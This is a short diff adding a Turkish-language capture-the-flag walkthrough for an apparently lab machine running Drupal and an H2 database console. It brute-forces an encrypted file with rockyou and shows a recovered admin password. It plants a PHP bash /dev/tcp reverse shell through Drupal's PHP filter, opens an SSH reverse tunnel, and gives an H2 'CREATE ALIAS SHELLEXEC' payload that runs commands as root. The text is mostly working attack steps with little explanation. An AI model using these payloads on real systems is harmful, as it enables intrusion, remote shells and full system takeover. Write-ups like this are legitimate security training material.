@@ -1,0 +1,42 @@
+ftp connect ile drupal.txt.enc aldık
+
+base64 -d hashdosyası > drupal.txt.dec
+
+bruteforce-salted-openssl -1 -t 100 -f rockyou.txt -d sha256 drupal.txt.dec
+
+openssl aes-256-cbc -d -a -in drupal.txt.enc  -out deneme.txt
+
+web arayüz girdik 
+
+user: admin
+password:  PencilKeyboardScanner123
+
+modules ten php filtered açtık
+
+nc -lvp 1234 yazdık
+
+add page dedik 
+
+reverse shell ekledik
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ıpadresim/1234 0>&1'");
+
+save dedik ve nc ekranından bağlantı kurduk
+user.txt aldık
+
+user aldığımız terminale 
+ssh root@kendi-ip-adresin -R 8888:127.0.0.1:8082
+bir kaç defa bunu yazdık ve kendi hesabımızın root şifresini 
+girdikten sonra bağlantı yaptık sonra tarayıcıdan 0.0.0.0:8888 adresine girdik
+
+karşımıza h2 consol çıktı burdan test yazan yeri test1 yapıyoruz ve connect diyoruz 
+sonra şu kodu karşımıza çıkan shell e ekliyoruz
+
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; } $$
+
+bu kodu direk yapıştırdık ve run dedik bundan sonra o kodu silip yerine 
+call SHELLEXEC ('id') bunu yazdık ve bize 0 yani root kullanıcısı olduğumuzu gösterdi
+
+en son olarak aynı yere call SHELLEXEC ('cat root.txt')
+
+yazdık ve root.txt mizi aldık
